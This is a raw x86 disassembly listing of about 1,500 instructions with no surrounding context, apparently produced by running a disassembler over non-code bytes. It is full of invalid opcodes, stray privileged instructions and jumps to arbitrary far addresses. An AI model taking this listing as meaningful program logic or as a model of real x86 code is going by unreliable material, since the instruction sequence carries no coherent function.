  417ef5:	into   
  417ef6:	rol    bh,1
  417ef8:	loopne 0x417ec4
  417efa:	call   0x826e6660
  417eff:	mov    ?,WORD PTR [ebx-0x102e84ae]
  417f05:	bound  ebx,QWORD PTR [edx+0x4b]
  417f08:	addr16 push ebx
  417f0a:	adc    BYTE PTR [ebx-0xbc65e74],bh
  417f10:	shl    DWORD PTR ds:0x53e75d97,1
  417f17:	or     edx,DWORD PTR [ebx+0x7e]
  417f1a:	and    eax,0x98f42b41
  417f1f:	cmp    eax,0xc4ece2fa
  417f24:	xchg   ebp,eax
  417f25:	dec    eax
  417f26:	or     ah,dh
  417f28:	inc    ebp
  417f29:	and    al,0xcb
  417f2b:	adc    eax,ecx
  417f2d:	(bad)  
  417f2e:	out    dx,eax
  417f2f:	sbb    eax,0xa57d207
  417f34:	cmp    eax,0x79ec32e
  417f39:	ds int 0xdd
  417f3c:	dec    edx
  417f3d:	mov    ds:0x8562991b,al
  417f42:	inc    esi
  417f43:	adc    esi,DWORD PTR [edi+0x3f15f7af]
  417f49:	retf   0xa849
  417f4c:	jo     0x417efb
  417f4e:	int    0x72
  417f50:	neg    BYTE PTR [esi]
  417f52:	lds    eax,FWORD PTR [ecx-0x751b0c4]
  417f58:	jne    0x417fa7
  417f5a:	add    cl,cl
  417f5c:	ja     0x417f15
  417f5e:	cmp    al,0xac
  417f60:	fist   WORD PTR [esi-0x63918784]
  417f66:	outs   dx,BYTE PTR ds:[esi]
  417f67:	mov    eax,ds:0xff149505
  417f6c:	sbb    DWORD PTR [eax],ebx
  417f6e:	adc    dl,ch
  417f70:	add    BYTE PTR [ebp+0x59f79c7f],cl
  417f76:	pop    ebx
  417f77:	pop    edx
  417f78:	cdq    
  417f79:	adc    edi,esi
  417f7b:	in     al,dx
  417f7c:	cs addr16 stc 
  417f7f:	sub    eax,0x810d6708
  417f84:	inc    ebp
  417f85:	ss push edi
  417f87:	lods   eax,DWORD PTR ds:[esi]
  417f88:	sbb    DWORD PTR [eax-0x2a],edi
  417f8b:	inc    esp
  417f8c:	mov    cs,WORD PTR [eax-0x438373bd]
  417f92:	push   ds
  417f93:	push   es
  417f94:	pop    esi
  417f95:	push   esi
  417f96:	mov    cl,0x93
  417f98:	dec    esp
  417f99:	std    
  417f9a:	dec    eax
  417f9b:	xchg   edi,eax
  417f9c:	jp     0x417f68
  417f9e:	cld    
  417f9f:	(bad)  
  417fa0:	pop    edx
  417fa1:	add    ecx,edx
  417fa3:	cli    
  417fa4:	add    eax,0x708d0186
  417fa9:	xor    bh,BYTE PTR [ecx+0x3cc29be4]
  417faf:	fcom   st(0)
  417fb1:	shl    BYTE PTR [ebx],0x18
  417fb4:	xchg   edi,eax
  417fb5:	or     esp,0x23781999
  417fbb:	popf   
  417fbc:	push   es
  417fbd:	push   edx
  417fbe:	xlat   BYTE PTR ds:[ebx]
  417fbf:	xchg   ebx,eax
  417fc0:	cmp    eax,0x6ad842cf
  417fc5:	lods   al,BYTE PTR ds:[esi]
  417fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fc7:	and    al,0xdb
  417fc9:	sub    eax,0x4a340b95
  417fce:	mov    ah,0x4a
  417fd0:	(bad)  
  417fd1:	push   ss
  417fd2:	std    
  417fd3:	lock mov ebp,0xc402bac7
  417fd9:	(bad)  
  417fda:	push   esi
  417fdb:	aaa    
  417fdc:	out    0x86,eax
  417fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fdf:	les    eax,FWORD PTR [eax-0x5b03b62b]
  417fe5:	(bad)  
  417fe6:	dec    BYTE PTR [ebx]
  417fe8:	cwde   
  417fe9:	sub    eax,DWORD PTR ds:0x9e74fd4a
  417fef:	sbb    DWORD PTR [ebp+0x189f99f2],esi
  417ff5:	pop    ss
  417ff6:	stos   BYTE PTR es:[edi],al
  417ff7:	lock stc 
  417ff9:	faddp  st(0),st
  417ffb:	sbb    al,0x74
  417ffd:	popf   
  417ffe:	xor    eax,0x8d6025e0
  418003:	mov    ah,BYTE PTR [ebx-0x5e21e528]
  418009:	mov    ah,0x9d
  41800b:	add    al,0xa7
  41800d:	(bad)  
  41800e:	ds push ds
  418010:	jae    0x418063
  418012:	mov    ds:0xe895afbd,eax
  418017:	mov    bl,bh
  418019:	test   ebp,ebx
  41801b:	pushf  
  41801c:	addr16 dec edi
  41801e:	lea    eax,ds:0x12adc777
  418024:	mov    WORD PTR [ecx],ss
  418026:	pop    ecx
  418027:	cmp    eax,0x5602a1ff
  41802c:	or     eax,0x41cc3ee0
  418031:	jmp    DWORD PTR ss:[eax+0x44292cfb]
  418038:	retf   
  418039:	lahf   
  41803a:	push   cs
  41803b:	repz adc eax,0x6580e06a
  418041:	dec    ecx
  418042:	jecxz  0x418004
  418044:	pop    esi
  418045:	mov    esi,0xc63b79c1
  41804a:	dec    edx
  41804b:	pop    ecx
  41804c:	inc    esi
  41804d:	arpl   WORD PTR ds:0xaa3060e7,sp
  418053:	mov    esi,0xda1748b
  418058:	call   0x2064cf20
  41805d:	add    DWORD PTR [edi+0x10],esi
  418060:	inc    eax
  418061:	(bad)  
  418062:	mov    dl,al
  418064:	sar    DWORD PTR [edi],0x53
  418067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418068:	das    
  418069:	sar    DWORD PTR [edx+0x81b0f8d],cl
  41806f:	xor    eax,0x4de0813a
  418074:	inc    ebx
  418075:	shl    BYTE PTR [eax],cl
  418077:	mov    ebp,DWORD PTR [ecx-0x3cb5b0a4]
  41807d:	test   bh,dh
  41807f:	ror    DWORD PTR [edx],cl
  418081:	fwait
  418082:	repnz dec eax
  418084:	sti    
  418085:	add    dh,BYTE PTR [eax+0x28]
  418088:	mov    bl,0x43
  41808a:	mov    bl,0x97
  41808c:	(bad)  
  41808d:	dec    esp
  41808e:	sub    edx,DWORD PTR [edx-0x2e0bb3f1]
  418094:	or     DWORD PTR [ecx],0x64
  418097:	frstor [eax]
  418099:	nop
  41809a:	std    
  41809b:	outs   dx,DWORD PTR ds:[esi]
  41809c:	mov    ds:0x4aa97304,eax
  4180a1:	mov    ah,0x94
  4180a3:	imul   eax,ebx,0xa7d5dfda
  4180a9:	sub    al,0x6a
  4180ab:	dec    ecx
  4180ac:	iret   
  4180ad:	pop    ebp
  4180ae:	cmp    DWORD PTR [esi+0x6552544a],0x1a295e0d
  4180b8:	aam    0xb8
  4180ba:	repz in al,dx
  4180bc:	(bad)  
  4180bd:	sbb    al,BYTE PTR [esi-0x5c]
  4180c0:	pushf  
  4180c1:	scas   al,BYTE PTR es:[edi]
  4180c2:	rol    DWORD PTR [ebp-0x3da1c128],cl
  4180c8:	arpl   WORD PTR [eax-0x4a2882f0],di
  4180ce:	call   0x44b8:0xb6492be0
  4180d5:	outs   dx,BYTE PTR ds:[esi]
  4180d6:	call   0x6a88:0xee51dfd3
  4180dd:	scas   al,BYTE PTR es:[edi]
  4180de:	jno    0x4180b9
  4180e0:	and    edi,esp
  4180e2:	ins    BYTE PTR es:[edi],dx
  4180e3:	add    BYTE PTR [ebx],dh
  4180e5:	jns    0x4180a8
  4180e7:	imul   esi,DWORD PTR [esp+ebx*4],0x6e4a8bb4
  4180ee:	fucomip st,st(4)
  4180f0:	cmp    esi,ecx
  4180f2:	xor    eax,DWORD PTR [ebx+esi*8+0x39]
  4180f6:	inc    ebp
  4180f7:	(bad)  [ebx+eiz*2-0x641253f6]
  4180fe:	pop    ebp
  4180ff:	lods   al,BYTE PTR ds:[esi]
  418101:	and    al,0xf1
  418103:	pop    esi
  418104:	adc    eax,0x3ca8bf0a
  418109:	sbb    eax,0xffa8f4fa
  41810e:	lds    eax,FWORD PTR [edi+edx*1+0x58]
  418112:	fsubr  DWORD PTR [edx+edi*2+0x19]
  418116:	jbe    0x418185
  418118:	adc    al,0x74
  41811a:	out    0xff,al
  41811c:	in     eax,0xb4
  41811e:	ss pop edx
  418120:	pop    eax
  418121:	mov    ah,0x2b
  418123:	stos   BYTE PTR es:[edi],al
  418124:	sub    DWORD PTR [ecx+0x19],esp
  418127:	aam    0x9b
  418129:	es push ds
  41812b:	gs mov ah,0xf4
  41812e:	pop    esp
  418130:	pop    cx
  418132:	mov    dh,0xa9
  418134:	adc    edx,DWORD PTR [ecx+ebp*4]
  418137:	lods   al,BYTE PTR ds:[esi]
  418138:	xchg   ebx,eax
  418139:	mov    esp,0xa6853a58
  41813e:	jbe    0x418149
  418140:	ins    BYTE PTR es:[edi],dx
  418141:	pop    ebp
  418142:	cdq    
  418143:	jmp    0x6ba3:0xcd63680b
  41814a:	add    dl,BYTE PTR [ecx]
  41814c:	or     BYTE PTR [esi+esi*2-0x15400c92],al
  418153:	mov    edx,0x2fdc9637
  418158:	cmp    BYTE PTR [ecx-0x23ab474f],0xd3
  41815f:	fs xor al,0x35
  418162:	and    ebx,DWORD PTR [ebx]
  418164:	(bad)  
  418166:	inc    edx
  418167:	or     DWORD PTR [edx+0x7cfa009e],eax
  41816d:	ret    0xfb99
  418170:	inc    esi
  418171:	in     eax,0x18
  418173:	mov    DWORD PTR [eax+ecx*1-0x6702a075],edi
  41817a:	int3   
  41817b:	xchg   ecx,eax
  41817c:	leave  
  41817d:	bound  esp,QWORD PTR [edi+0x7f]
  418180:	and    edi,esi
  418182:	retf   0x11b5
  418185:	out    0x50,eax
  418187:	cs dec esi
  418189:	pusha  
  41818a:	jl     0x418169
  41818c:	mov    DWORD PTR [edx-0x29b607c],ebx
  418192:	push   esi
  418193:	xlat   BYTE PTR ds:[ebx]
  418194:	dec    edi
  418195:	inc    ebp
  418196:	xchg   ecx,eax
  418197:	test   al,0xd5
  418199:	lock aaa 
  41819b:	scas   eax,DWORD PTR es:[edi]
  41819c:	dec    eax
  41819d:	cmp    BYTE PTR [edx+eiz*1],0x25
  4181a1:	popa   
  4181a2:	das    
  4181a3:	idiv   DWORD PTR [ecx+0x7]
  4181a6:	lock retf 0x376
  4181aa:	(bad)  
  4181ab:	imul   esi,DWORD PTR [edi+0x6a683b79],0x1e6f58a1
  4181b5:	out    0xee,eax
  4181b7:	push   eax
  4181b8:	jp     0x4181d8
  4181ba:	sbb    eax,edx
  4181bc:	scas   al,BYTE PTR es:[edi]
  4181bd:	test   DWORD PTR [edx+0x2f],esp
  4181c0:	jl     0x418197
  4181c2:	or     eax,0xd10fcbba
  4181c7:	mov    ebx,DWORD PTR [ecx]
  4181c9:	mov    DWORD PTR [ebx+0x70],eax
  4181cc:	(bad)  
  4181cd:	fst    DWORD PTR [eax+edx*4]
  4181d0:	lods   eax,DWORD PTR ds:[esi]
  4181d1:	ja     0x418157
  4181d3:	dec    esi
  4181d4:	inc    eax
  4181d5:	mov    al,ds:0xc81eabc2
  4181da:	call   0x1c4a:0x1d528396
  4181e1:	mov    ds:0x3576f52,al
  4181e6:	out    0x7f,eax
  4181e8:	mov    ah,0x1d
  4181ea:	fnstsw WORD PTR gs:[ebx+0xbf65645]
  4181f1:	fisttp WORD PTR [ebx+0x44f2cf8b]
  4181f7:	pop    esi
  4181f8:	dec    esp
  4181f9:	or     ah,dh
  4181fb:	pop    esi
  4181fc:	fild   WORD PTR [ecx+0x23]
  4181ff:	int3   
  418200:	push   ds
  418201:	mov    dl,0xcc
  418203:	pop    ebp
  418204:	push   edi
  418205:	cmp    bl,dl
  418207:	fxch   st(2)
  418209:	mov    bl,0xcc
  41820b:	lea    esi,[edi]
  41820d:	jg     0x41827e
  41820f:	call   0x81b61bf5
  418214:	ret    
  418215:	add    DWORD PTR [ecx-0x1097ccc2],ebp
  41821b:	adc    ah,BYTE PTR [ebp-0x7f1a9a68]
  418221:	xchg   BYTE PTR [edi-0x2a8719c8],ah
  418227:	and    eax,0xd15b65fe
  41822c:	retf   0x44fe
  41822f:	pcmpgtd mm6,mm3
  418232:	dec    ebx
  418233:	shl    BYTE PTR [ecx+0xa],1
  418236:	and    eax,0x4efabf37
  41823b:	sti    
  41823c:	xchg   ebx,eax
  41823d:	mov    al,0xe5
  41823f:	mov    ds:0x501392b,al
  418244:	jno    0x4182b1
  418246:	popa   
  418247:	dec    edx
  418248:	adc    edx,DWORD PTR [ebx-0x48]
  41824b:	fld    QWORD PTR [edi+0x7]
  41824e:	xchg   edx,eax
  41824f:	pushf  
  418250:	leave  
  418251:	fidivr WORD PTR [ebx-0x5e]
  418254:	(bad)  [esi]
  418256:	dec    esp
  418257:	sub    ax,0xa72f
  41825b:	inc    esi
  41825c:	popf   
  41825d:	xchg   ecx,eax
  41825e:	stos   BYTE PTR es:[edi],al
  41825f:	mov    esi,0xb2622edd
  418265:	adc    BYTE PTR [eax-0x73],dl
  418268:	test   al,0x21
  41826a:	cmp    eax,0x7056a746
  41826f:	out    0x28,al
  418271:	lds    ebp,FWORD PTR [esi-0x1017ef70]
  418277:	xchg   esi,eax
  418278:	jo     0x41821e
  41827a:	jb     0x418266
  41827c:	mov    esp,0x34b2824
  418281:	push   eax
  418282:	xor    BYTE PTR [edi-0x6c1a0546],0xcb
  418289:	iret   
  41828a:	push   esp
  41828b:	fcmovnb st,st(5)
  41828d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41828e:	xchg   BYTE PTR [ebp+0x5789a426],dh
  418294:	push   es
  418295:	ja     0x41821e
  418297:	jg     0x4182ff
  418299:	test   al,0xf
  41829b:	arpl   WORD PTR [ebx],bx
  41829d:	push   0xffffffa3
  41829f:	int    0xbb
  4182a1:	add    ebp,DWORD PTR [ecx+eax*1]
  4182a4:	mov    dl,0x34
  4182a6:	shl    DWORD PTR [ebp-0x19032cb3],0xfb
  4182ad:	ss pushf 
  4182af:	out    dx,al
  4182b0:	icebp  
  4182b1:	mov    ebx,0x72a0d7fd
  4182b6:	dec    edx
  4182b7:	add    ch,BYTE PTR [ebp+0x5fb31499]
  4182bd:	push   edx
  4182be:	push   edx
  4182bf:	hlt    
  4182c0:	xor    cl,BYTE PTR [esi]
  4182c2:	fadd   QWORD PTR ds:0xd2fb12eb
  4182c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182c9:	mov    al,ds:0xbc848963
  4182ce:	enter  0x1a88,0x90
  4182d2:	aam    0x33
  4182d4:	mov    al,ds:0xecca2356
  4182d9:	aad    0xca
  4182db:	sbb    DWORD PTR [ebp+0x21271025],0x3b1fd323
  4182e5:	xchg   ebp,eax
  4182e6:	mov    cl,0xae
  4182e8:	push   es
  4182e9:	dec    edx
  4182ea:	inc    edi
  4182eb:	aas    
  4182ec:	popf   
  4182ed:	dec    esp
  4182ee:	imul   DWORD PTR [edx+0x4e]
  4182f1:	sub    DWORD PTR [ecx],esp
  4182f3:	mov    esp,0x71d29d2b
  4182f8:	fs call 0xc127eac6
  4182fe:	xchg   edi,eax
  4182ff:	hlt    
  418300:	cmp    BYTE PTR [ebx],dh
  418302:	mov    bl,0x64
  418304:	mov    al,ds:0x3f7f9675
  418309:	inc    esi
  41830a:	sub    al,0xd0
  41830c:	aas    
  41830d:	xor    BYTE PTR [esi],ah
  41830f:	jge    0x418324
  418311:	dec    ecx
  418312:	push   ebx
  418313:	imul   eax,DWORD PTR [edi+0x355457c2],0x4347bf1d
  41831d:	mov    esp,0x300ed254
  418322:	push   ds
  418323:	sbb    ch,BYTE PTR [esi-0x1f49e4e0]
  418329:	mov    edx,DWORD PTR [ebp+0x45]
  41832c:	mov    edi,edi
  41832e:	fldenv [esi+0x3a47dd2c]
  418334:	mov    ch,0x28
  418336:	(bad)  
  418337:	retf   
  418338:	jmp    0xf6d66add
  41833d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41833e:	mov    ds:0xf441e63,eax
  418343:	mov    eax,0xd9d423f1
  418348:	fistp  QWORD PTR [eax+0x2e]
  41834b:	ret    
  41834c:	pushf  
  41834d:	add    edx,edx
  41834f:	pop    ds
  418350:	mov    BYTE PTR [ecx-0x2b],al
  418353:	mov    ecx,0x96771eaf
  418358:	xor    edi,DWORD PTR [ebp+0x227fcd48]
  41835e:	pop    edi
  41835f:	cmc    
  418360:	ret    
  418361:	inc    edx
  418362:	mov    DWORD PTR [edi],ebx
  418364:	add    BYTE PTR [ecx-0x64299f97],ch
  41836a:	xchg   DWORD PTR [eax-0x38],edx
  41836d:	leave  
  41836e:	out    dx,eax
  41836f:	pop    ebp
  418370:	mov    edi,0xfb24c0dd
  418375:	(bad)  
  418376:	fmul   QWORD PTR [esi-0x37cdc518]
  41837c:	imul   eax,DWORD PTR [ebx+0x3a],0xffffff8e
  418380:	mov    ebp,0x6579e045
  418385:	popf   
  418386:	dec    edx
  418387:	bswap  ebp
  418389:	push   ebp
  41838a:	imul   esp,esp,0x73d0f7cc
  418390:	mov    es,ecx
  418392:	int    0xbf
  418394:	scas   eax,DWORD PTR es:[edi]
  418395:	out    dx,al
  418396:	mov    BYTE PTR [edx+0x16],cl
  418399:	les    edi,FWORD PTR [edx+0x72fd8243]
  41839f:	or     edi,eax
  4183a1:	test   DWORD PTR [ebx-0xb],0xc1cf9993
  4183a8:	or     cl,dh
  4183aa:	pop    edx
  4183ab:	cmp    DWORD PTR [esi-0x76],edi
  4183ae:	mov    esp,0x30aa6d08
  4183b3:	mov    dh,0x5e
  4183b5:	xor    eax,0x61f0fe0d
  4183ba:	xchg   ebx,ebx
  4183bc:	std    
  4183bd:	jae    0x418392
  4183bf:	nop
  4183c0:	test   BYTE PTR fs:[eax+0x4e],0x40
  4183c5:	imul   edx,DWORD PTR [edi],0x4baff5e1
  4183cb:	test   esp,ebx
  4183cd:	push   es
  4183ce:	sbb    eax,0x91ee1929
  4183d3:	nop
  4183d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183d5:	mov    ds:0x6382537a,al
  4183da:	push   0x1c
  4183dc:	jp     0x418453
  4183de:	sbb    cl,BYTE PTR [edx-0x854ecb7]
  4183e4:	push   es
  4183e5:	addr16 add eax,0x81ef4723
  4183eb:	push   0xffffffc0
  4183ed:	mov    al,fs:0xff1c114e
  4183f3:	jo     0x4183d8
  4183f5:	fwait
  4183f6:	ret    
  4183f7:	sub    DWORD PTR [esi-0xa],esi
  4183fa:	shl    eax,cl
  4183fc:	popa   
  4183fd:	test   eax,0xdd89651d
  418402:	lods   al,BYTE PTR ds:[esi]
  418403:	pop    ss
  418404:	add    eax,0xc1e72654
  418409:	inc    edx
  41840a:	push   esp
  41840b:	mov    ss,WORD PTR [ecx+0x1e883193]
  418411:	mov    esp,0xea9bf1dc
  418416:	dec    ecx
  418417:	mov    dl,0x94
  418419:	jae    0x4183af
  41841b:	arpl   WORD PTR [esi],si
  41841d:	por    mm2,mm1
  418420:	sbb    BYTE PTR fs:[ecx-0x6d],bh
  418424:	mov    WORD PTR [edi+0x6f],ds
  418427:	or     eax,DWORD PTR [ebp+0x4d5de5fd]
  41842d:	mov    ds:0x54684971,eax
  418432:	outs   dx,DWORD PTR ds:[esi]
  418433:	push   esi
  418434:	inc    esi
  418435:	pop    es
  418436:	jbe    0x41845f
  418438:	xlat   BYTE PTR ds:[ebx]
  418439:	leave  
  41843a:	lea    ebx,[edi+0x23]
  41843d:	and    esp,DWORD PTR [ecx-0x5bb0843d]
  418443:	jmp    0x418446
  418445:	and    eax,0xd16c6916
  41844a:	mov    ds:0x85c27219,al
  41844f:	inc    eax
  418450:	or     dl,dh
  418452:	xchg   BYTE PTR [esi-0x38d22100],dh
  418458:	out    dx,al
  418459:	je     0x41847c
  41845b:	retf   0x3dce
  41845e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41845f:	mov    es,WORD PTR [esi]
  418461:	mov    DWORD PTR [edx-0x4fde58d9],ecx
  418467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418468:	and    BYTE PTR [edx-0x3a],ch
  41846b:	pop    ss
  41846c:	ss jmp 0xb19db9d2
  418472:	jg     0x418482
  418474:	cld    
  418475:	fcom   DWORD PTR [eax+0x12]
  418478:	out    0x1,eax
  41847a:	stos   BYTE PTR es:[edi],al
  41847b:	call   0x593b:0x7cde232a
  418482:	in     al,0x1e
  418484:	and    al,0x6a
  418486:	loope  0x418456
  418488:	imul   eax,edx,0xffffffe1
  41848b:	add    al,0x18
  41848d:	aad    0x90
  41848f:	sub    BYTE PTR [ebp+0x3de1d436],dl
  418495:	es and eax,0xf9796f48
  41849b:	push   cs
  41849c:	xor    DWORD PTR [edi-0x4f025f4f],0x31
  4184a3:	inc    ebp
  4184a4:	adc    dl,BYTE PTR [edx+0x284d35c2]
  4184aa:	nop
  4184ab:	cmp    eax,0xc3efbe80
  4184b0:	outs   dx,DWORD PTR ds:[esi]
  4184b1:	test   al,0xd3
  4184b3:	push   es
  4184b4:	pop    es
  4184b5:	cwde   
  4184b6:	and    bh,BYTE PTR [edx+0x4b]
  4184b9:	or     eax,0x818aea9d
  4184be:	push   0x3c669c11
  4184c3:	inc    edx
  4184c4:	jmp    0x856eedce
  4184c9:	mov    ebx,0x384b0bce
  4184cf:	or     al,0x13
  4184d1:	xor    bh,bh
  4184d3:	fnsave [ebx]
  4184d5:	mov    dh,BYTE PTR [edx]
  4184d7:	outs   dx,BYTE PTR ds:[esi]
  4184d8:	cmp    eax,0x16f1e1e8
  4184dd:	mov    cl,0x61
  4184df:	dec    esp
  4184e0:	mov    dh,0x71
  4184e2:	mov    dh,BYTE PTR [esi+eiz*2]
  4184e5:	inc    ebx
  4184e6:	mov    ebp,DWORD PTR [edi+ebp*2-0x5a]
  4184ea:	nop
  4184eb:	xchg   edi,eax
  4184ec:	add    DWORD PTR [edx-0x75],ecx
  4184ef:	mov    ebx,0x21d5f3db
  4184f4:	pop    edx
  4184f5:	jmp    0x38c0:0x3bd1a7c
  4184fc:	out    0x62,eax
  4184fe:	jns    0x418503
  418500:	pop    esp
  418501:	leave  
  418502:	repnz sub eax,0x792f56aa
  418508:	sbb    BYTE PTR [edi],0x7b
  41850b:	pop    esi
  41850c:	cmp    dl,BYTE PTR [edx-0x53548ae1]
  418512:	xor    ebp,ecx
  418514:	popa   
  418515:	sub    esi,DWORD PTR [eax-0x1f027eb7]
  41851b:	ja     0x418592
  41851d:	scas   al,BYTE PTR es:[edi]
  41851e:	xchg   esp,eax
  41851f:	ret    0x4548
  418522:	dec    edi
  418523:	into   
  418524:	popa   
  418525:	mov    ecx,0x534aebd
  41852a:	ins    BYTE PTR es:[edi],dx
  41852b:	adc    DWORD PTR [edx],0x42
  41852e:	cwde   
  41852f:	mov    BYTE PTR [ecx+ebx*4+0x40],dh
  418533:	adc    bl,bl
  418535:	xchg   esi,eax
  418536:	into   
  418537:	dec    esp
  418538:	and    eax,0x18e61014
  41853d:	adc    esp,ebp
  41853f:	pop    ds
  418540:	jbe    0x418547
  418542:	fcmovnb st,st(1)
  418544:	sbb    bl,ch
  418546:	retf   0x84cd
  418549:	mov    cl,0xd0
  41854b:	xchg   edx,eax
  41854c:	test   DWORD PTR [ebx],ecx
  41854e:	out    0xf,al
  418550:	leave  
  418551:	sbb    DWORD PTR [edx],0xbd447c67
  418557:	add    al,0x9f
  418559:	or     al,0x1c
  41855b:	jge    0x4185d2
  41855d:	xor    edx,DWORD PTR [esi]
  41855f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418560:	sbb    al,0x9c
  418562:	int3   
  418563:	cmp    edx,edi
  418565:	inc    edx
  418566:	sti    
  418567:	js     0x4184ff
  418569:	xchg   ebp,eax
  41856a:	sbb    BYTE PTR [esi-0x55],ah
  41856d:	pop    esi
  41856e:	dec    eax
  41856f:	mov    eax,ds:0x8fe1f7dd
  418574:	dec    edi
  418575:	mov    bl,0xda
  418577:	inc    ecx
  418578:	ret    0xfcb8
  41857b:	ins    DWORD PTR es:[edi],dx
  41857c:	cwde   
  41857d:	sbb    ebp,DWORD PTR [ecx-0x507dc30e]
  418583:	or     ebx,edx
  418585:	inc    ecx
  418586:	fs push edx
  418588:	and    DWORD PTR [ebp+0x47b8f7f9],eax
  41858e:	mov    ds,esi
  418590:	jno    0x4185ad
  418592:	das    
  418593:	add    esp,ebx
  418595:	adc    al,0x38
  418597:	fwait
  418598:	cmp    BYTE PTR [ebx-0x25bee38f],0x13
  41859f:	ja     0x418573
  4185a1:	sub    al,0xa
  4185a3:	inc    edi
  4185a4:	cs cld 
  4185a6:	cs push eax
  4185a8:	sbb    esp,ebp
  4185aa:	shl    esp,0xe
  4185ad:	mov    al,ds:0xc5a3a27
  4185b2:	movaps xmm7,xmm7
  4185b5:	xchg   ebp,eax
  4185b6:	dec    esp
  4185b7:	add    edi,ebx
  4185b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ba:	outs   dx,BYTE PTR ds:[esi]
  4185bb:	test   al,0xdc
  4185bd:	in     eax,0x66
  4185bf:	js     0x4185ff
  4185c1:	dec    edi
  4185c2:	inc    eax
  4185c3:	dec    ebx
  4185c4:	cmp    dl,BYTE PTR [ebx]
  4185c6:	ror    DWORD PTR [edx-0x1f4a8c6],0x1e
  4185cd:	and    DWORD PTR [edx],edi
  4185cf:	add    bl,BYTE PTR [esi+0x3f]
  4185d2:	test   DWORD PTR [ebp+0x78e9dd0f],esp
  4185d8:	push   ss
  4185d9:	adc    edi,0x8a56605c
  4185df:	jmp    0x4185a0
  4185e1:	inc    ebp
  4185e2:	mov    al,ds:0xe8c50d92
  4185e7:	mov    ch,al
  4185e9:	adc    bl,bl
  4185eb:	nop
  4185ec:	cdq    
  4185ed:	es sub eax,0x5ce51a3f
  4185f3:	add    edx,edx
  4185f5:	jb     0x418615
  4185f7:	push   ss
  4185f8:	cmp    BYTE PTR [edx+ecx*2-0x6ba78c5f],0xd0
  418600:	in     eax,0xbb
  418602:	ror    DWORD PTR [edi+0x4e],cl
  418605:	mov    edi,0xefd50095
  41860a:	cmp    al,0x19
  41860c:	(bad)  
  41860d:	shl    BYTE PTR [edi+eax*4-0x66c14b83],1
  418614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418615:	icebp  
  418616:	inc    esi
  418617:	in     eax,0x1d
  418619:	jmp    0x4185ab
  41861b:	or     al,0x9d
  41861d:	adc    eax,0x4f8c4f5c
  418622:	mov    ds:0x4086fdd0,eax
  418627:	mov    edx,0x66166190
  41862c:	push   cs
  41862d:	pop    esi
  41862e:	xchg   BYTE PTR [ebx-0x13abe960],dh
  418634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418635:	les    ebx,FWORD PTR [eax-0x48]
  418638:	std    
  418639:	test   DWORD PTR [ecx],eax
  41863b:	inc    ebp
  41863c:	inc    ebx
  41863d:	bound  edx,QWORD PTR [ecx+ecx*1+0x62]
  418641:	test   BYTE PTR [ebx+0x23],ch
  418644:	int3   
  418645:	xor    al,0xdd
  418647:	test   ebx,0x3fd45c1
  41864d:	pop    ebp
  41864e:	push   ss
  41864f:	es enter 0x7073,0xde
  418654:	pop    edi
  418655:	idiv   DWORD PTR [eax+0x5463e7df]
  41865b:	jb     0x418672
  41865d:	push   esi
  41865e:	fcom   DWORD PTR [ecx-0x4f22a9fc]
  418664:	xor    eax,0x845629ec
  418669:	jns    0x418655
  41866b:	and    BYTE PTR [esi+0x5f85abda],cl
  418671:	and    DWORD PTR [edx+0x5e],edi
  418674:	sbb    edi,ebp
  418676:	into   
  418677:	frstor [esi+0x75773c01]
  41867d:	mov    es,WORD PTR [edx]
  41867f:	pushf  
  418680:	sahf   
  418681:	(bad)  
  418682:	xor    eax,0xdd4fea1f
  418687:	repnz fsubr st(4),st
  41868a:	fwait
  41868b:	test   DWORD PTR [edi],esi
  41868d:	in     eax,0x2b
  41868f:	retf   
  418690:	push   edx
  418691:	mov    ebp,0x8310bba0
  418696:	adc    al,0x19
  418698:	add    al,0x9b
  41869a:	or     dh,BYTE PTR [ebp+0x35008f9b]
  4186a0:	retf   
  4186a1:	pop    ss
  4186a2:	std    
  4186a3:	popa   
  4186a4:	xchg   DWORD PTR [ecx+0x2cc4615],esp
  4186aa:	xor    ebx,eax
  4186ac:	push   edx
  4186ad:	aam    0xa2
  4186af:	sbb    eax,0x7b663670
  4186b4:	pop    edi
  4186b5:	bound  esp,QWORD PTR [ebp+0x3ac794c7]
  4186bb:	ss out dx,eax
  4186bd:	pop    ebp
  4186be:	mov    cl,0x32
  4186c0:	adc    ecx,edx
  4186c2:	and    bh,al
  4186c4:	test   DWORD PTR [ecx-0x46],ebp
  4186c7:	mov    esp,0x77f6e311
  4186cc:	inc    edi
  4186cd:	xchg   esp,eax
  4186ce:	stos   BYTE PTR es:[edi],al
  4186cf:	or     al,0x40
  4186d1:	mov    ebx,0x28191d31
  4186d6:	push   cs
  4186d7:	sbb    eax,0x6f73d097
  4186dc:	aad    0x51
  4186de:	push   es
  4186df:	inc    esp
  4186e0:	cmp    eax,0x2bed114e
  4186e5:	mov    edx,0xf0490e55
  4186ea:	fbld   TBYTE PTR [ecx]
  4186ec:	and    al,0x91
  4186ee:	sbb    bl,ch
  4186f0:	(bad)  
  4186f1:	ficom  WORD PTR [ebp+0x7d]
  4186f4:	stos   BYTE PTR es:[edi],al
  4186f5:	stos   BYTE PTR es:[edi],al
  4186f6:	lock int3 
  4186f8:	push   ss
  4186f9:	sbb    esp,DWORD PTR [ebp-0x2d]
  4186fc:	cli    
  4186fd:	sbb    eax,0xccbae415
  418702:	(bad)  
  418703:	cmp    ebx,DWORD PTR [esi-0x4d2a9252]
  418709:	sub    edi,esp
  41870b:	sub    dh,BYTE PTR [esi-0x6c1ba792]
  418711:	mov    ebp,0x4885fbda
  418716:	ret    0x477e
  418719:	cdq    
  41871a:	inc    edx
  41871b:	jne    0x4186d2
  41871d:	sar    DWORD PTR [esi-0x56],cl
  418720:	sub    DWORD PTR ds:0x600b08dc,esi
  418726:	cmp    eax,0x3ac94956
